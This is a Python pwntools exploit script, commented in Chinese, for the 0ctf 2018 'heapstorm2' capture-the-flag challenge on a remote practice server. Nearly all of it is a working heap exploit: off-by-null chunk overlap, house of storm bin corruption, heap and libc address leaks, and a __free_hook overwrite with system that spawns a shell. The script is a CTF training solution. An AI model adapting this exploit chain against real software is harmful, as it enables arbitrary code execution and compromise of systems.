from pwn import *
from pwn import p32,p64,u32,u64

context.log_level = 'debug'

p = remote('node4.buuoj.cn',25201)
#p = process('./0ctf_2018_heapstorm2')
libc = ELF('./libc-2.23.so')

def add(size):
    p.sendlineafter(b'Command: ',b'1')
    p.sendlineafter(b'Size: ',str(size))  # 12<size<0x1000

def edit(idx,content):
    p.sendlineafter(b'Command: ',b'2')
    p.sendlineafter(b'Index: ',str(idx))
    p.sendlineafter(b'Size: ',str(len(content)))
    p.recvuntil(b'Content: ')
    p.send(content)

def delete(idx):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline('%d' % idx)

def show(idx):
    p.sendlineafter(b'Command: ',b'4')
    p.sendlineafter(b'Index: ',str(idx))

#---------------布置chunk-------------------------#
add(0x18)#0	  off_by_null修改1的size
add(0x508)#1
add(0x18)#2
#---------------
add(0x18)#3   off_by_null修改4的size
add(0x508)#4
add(0x18)#5   
#---------------
add(0x18)#6   防止合并到top_chunk

#----------------准备 unsorted chunk-----------------------#
edit(1,b'\x00'*0x4F0 + p64(0x500)) #伪造chunk
delete(1)
edit(0,b'\x00'*(0x18-12)) #修改chunk1的size， 0x511->0x500
add(0x18) #1 
add(0x4d8) #7    把0x500用完

delete(1)   
delete(2) #1-2 合并   这是就存在堆重叠

add(0x38)#1
add(0x4e8)#2   chunk7的content指向chunk2的chunk-0x10位置处,我们可以实现控制unsorted chunk

#-------------------准备 large chunk-----------------------------------#
edit(4,b'\x00'*0x4F0+p64(0x500))#伪造chunk
delete(4)
edit(3,b'\x00'*(0x18-12)) #修改chunk4的size， 0x511->0x500
add(0x18) #4
add(0x4d8) #8   把0x500用完

delete(4)
delete(5) #4-5 合并 这是就存在堆重叠

add(0x48)#4  此时unsorted bin中剩下一个0x4e1大小的chunk，且与8重叠，我们可以实现控制large chunk
#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
delete(2)
add(0x4e8) #把0x4e1的chunk放入到largebin中
delete(2)  #把0x4F1的chunk放入到unsorted bin中
#--------------修改他们使满足条件进行 house of strom------------------------------#
fake_chunk = 0x13370800 - 0x20
payload = b'\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
edit(7, payload) #修改unsorted chunk的bk

payload = b'\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)
edit(8, payload) #修改 large chunk 的 bk 和 bk_nextsize
add(0x48)  #2  -> 0x133707e0   成功将申请到了heaparray附近
#-----------------------泄漏 libc----------------------------------#
#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址

payload = p64(0)*6 + p64(0x13370800)
edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0

payload = p64(0)*3 +p64(0x13377331)  #满足show的条件
payload += p64(0x13370800) + p64(0x1000) #chunk0
payload += p64(fake_chunk+3) + p64(8)   #chunk1
edit(0, payload) #满足show的条件

show(1)  #我们刚刚house of storm 写的地址泄漏出来
p.recvuntil("]: ")
heap = u64(p.recv(6).ljust(8, b'\x00'))
success("heap:"+hex(heap))

payload  = p64(0)*3 + p64(0x13377331)#满足show的条件
payload += p64(0x13370800) + p64(0x1000) #chunk0
payload += p64(heap+0x10) + p64(8) #chunk1
edit(0, payload)

show(1) #泄漏libc地址
p.recvuntil("]: ")
malloc_hook = u64(p.recv(6).ljust(8, b'\x00')) -0x58 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+ libc.sym['system']
success("free_hook:"+hex(free_hook))
#--------------修改 free_hook -----------------------------------#
payload  = p64(0)*4
payload += p64(free_hook) + p64(0x100)#chunk0
payload += p64(0x13370800+0x40) + p64(8)#chunk1
payload += b'/bin/sh\x00'
edit(0, payload)
edit(0, p64(system))
delete(1)

p.interactive()
